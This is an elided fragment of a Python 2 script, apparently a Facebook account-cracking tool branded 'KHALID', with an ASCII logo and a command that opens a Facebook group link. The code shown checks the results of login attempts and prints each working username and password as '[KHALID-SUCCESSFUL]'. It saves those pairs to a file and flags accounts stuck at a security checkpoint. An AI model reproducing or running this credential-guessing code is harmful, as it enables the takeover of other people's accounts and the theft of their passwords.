...
logo = """
      ...
      888888 88   88 888888 88   88 88     
  88   88   88   88   88   88 88     
  88   Y8   8P   88   Y8   8P 88  .o 
  88   `YbodP'   88   `YbodP' 88ood8 
...
os.system('xdg-open https://facebook.com/groups/mental.gang.ccc5.tor.real.bap/')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[KHALID-SUCCESSFUL]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n' + '\x1b[1;92m  [Login Now]\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + c + pass1 + '\n')
                okb.close()
                oks.append(c + user + c + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;96m[KHALID-CHECKPOINT] \x1b[1;97m' + k + c + user + ' | ' + pass1 + '\x1b[1;96m  [Login After 10 Days]\n'
